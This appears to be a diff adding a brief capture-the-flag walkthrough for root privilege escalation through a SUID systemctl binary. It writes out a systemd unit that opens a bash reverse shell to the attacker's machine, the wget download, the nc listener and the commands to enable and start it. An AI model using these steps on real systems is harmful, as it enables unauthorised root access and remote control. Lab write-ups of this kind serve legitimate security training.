@@ -1,0 +1,20 @@
+1- we searched for all suid files using command 'find / -perm -u=s -type f 2>/dev/null '
+2- we identified /bin/systemctl file
+3- we created the root. service file on the server as below
+
+[Unit]
+Description=root
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<our-tun0-ip>/1234 0>&1"
+[Install]
+WantedBy=multi-user.target
+
+4- i hosted the file on my apache server and downloaded it on target machine using 'wget http://LHOST/root.service'
+5- establish a new listner 'nc -nlvp <port>'
+6- start the service 'systemctl enable /tmp/root.service'
+7- set the root shell 'systemctl start root'
+8- search for the flag 'find / -name root.txt 2>/dev/null'
+9- you will get the flag 
